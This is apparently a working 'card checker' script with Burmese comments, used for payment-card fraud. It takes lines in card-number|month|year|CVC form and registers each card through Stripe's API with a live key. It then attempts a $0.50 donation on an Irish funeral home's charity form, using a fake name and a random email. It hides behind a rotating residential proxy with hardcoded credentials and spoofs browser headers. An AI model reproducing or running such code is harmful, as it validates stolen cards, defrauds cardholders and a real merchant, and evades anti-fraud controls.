import requests, re
import random
import string
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# ==========================================
# 👇 PROXY SETTINGS (US Virginia Beach 🇺🇸 + Auto Retry)
# ==========================================

PROXY_HOST = 'geo.g-w.info'
PROXY_PORT = '10080'

# 🔥 မင်းရဲ့ Proxy User/Pass
PROXY_USER = 'user-7xkEOw8bXcNNWHHW-type-residential-session-fza74r8r-country-US-city-San_Francisco-rotation-15'
PROXY_PASS = 'CMvQFPYozpgFTlXC'

# Proxy String
proxy_url = f"http://{PROXY_USER}:{PROXY_PASS}@{PROXY_HOST}:{PROXY_PORT}"
proxies = {
    'http': proxy_url,
    'https': proxy_url
}

def Tele(ccx):
    try:
        ccx = ccx.strip()
        n = ccx.split("|")[0]
        mm = ccx.split("|")[1]
        yy = ccx.split("|")[2]
        cvc = ccx.split("|")[3]

        if "20" in yy:
            yy = yy.split("20")[1]

        letters = string.ascii_lowercase + string.digits
        random_name = ''.join(random.choice(letters) for i in range(10))
        random_email = f"{random_name}@gmail.com"

        # 🔥 RETRY SYSTEM UPGRADE (Connection ငြိမ်အောင်)
        session = requests.Session()
        # Total=5 ခါကြိုးစားမယ်, 500/502/503/504 error တွေကို auto retry လုပ်မယ်
        retry = Retry(
            total=5, 
            backoff_factor=1, 
            status_forcelist=[500, 502, 503, 504]
        )
        adapter = HTTPAdapter(max_retries=retry)
        session.mount('http://', adapter)
        session.mount('https://', adapter)
        session.proxies = proxies

        # ==========================================
        # Step 1: Create Payment Method (Stripe)
        # ==========================================
        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            # 🔥 User-Agent ကို PC (Windows 10) ပြောင်းလိုက်ပြီ
            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
            'sec-ch-ua-mobile': '?0',  # Mobile မဟုတ်ကြောင်း (?0)
            'sec-ch-ua-platform': '"Windows"', # Platform Windows
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        }
        
        data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2Fc264a67020%3B+stripe-js-v3%2Fc264a67020%3B+card-element&key=pk_live_51JNN5kCPT27SWWccxqzoGW8uBAVSg8XaS1aFtpbAD8nRcPLmqOyajKoGVA3Pfh9mgZ7EBGaro0mS9BrLxwO2yCmH00ssRNida2'
        
        # Timeout ကို 60s ထိ တိုးပေးထားတယ်
        response = session.post(
            'https://api.stripe.com/v1/payment_methods',
            headers=headers,
            data=data,
            timeout=60 
        )

        if 'id' not in response.json():
            return "Proxy Error (PM Failed) ❌"
            
        pm = response.json()['id']

        # ==========================================
        # Step 2: Charge Request (Brendan Ennis Funerals)
        # ==========================================
        headers = {
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Origin': 'https://brendanennisfunerals.ie',
            'Referer': 'https://brendanennisfunerals.ie/help-a-family-with-costs/',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            # 🔥 Step 2 မှာလည်း User-Agent ကို Windows နဲ့ ညီအောင်ညှိပေးထားတယ်
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'X-Requested-With': 'XMLHttpRequest',
            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }

        data = {
            'action': 'wp_full_stripe_inline_donation_charge',
            'wpfs-form-name': 'help-a-family-with-cost',
            'wpfs-form-get-parameters': '%7B%7D',
            'wpfs-custom-amount': 'other',
            'wpfs-custom-amount-unique': '0.5',
            'wpfs-donation-frequency': 'one-time',
            'wpfs-custom-input[]': [
                'Min Thant',
                'US',
                '13125550124',
            ],
            'wpfs-card-holder-email': random_email,
            'wpfs-card-holder-name': 'Min Thant',
            'wpfs-stripe-payment-method-id': f'{pm}',
        }

        # Timeout ကို 60s ထိ တိုးပေးထားတယ်
        response = session.post(
            'https://brendanennisfunerals.ie/wp-admin/admin-ajax.php',
            headers=headers,
            data=data,
            timeout=60
        )
        
        try:
            result = response.json()['message']
        except:
            if "Cloudflare" in response.text or response.status_code == 403:
                result = "IP Blocked by Site ❌"
            else:
                result = "Decline⛔"

    except Exception as e:
        # ၅ ခါလုံး Retry လုပ်လို့မှ မရရင်တော့ တကယ် Error ပါ
        result = f"Connection Failed (Retry Limit) ⚠️"
        
    return result
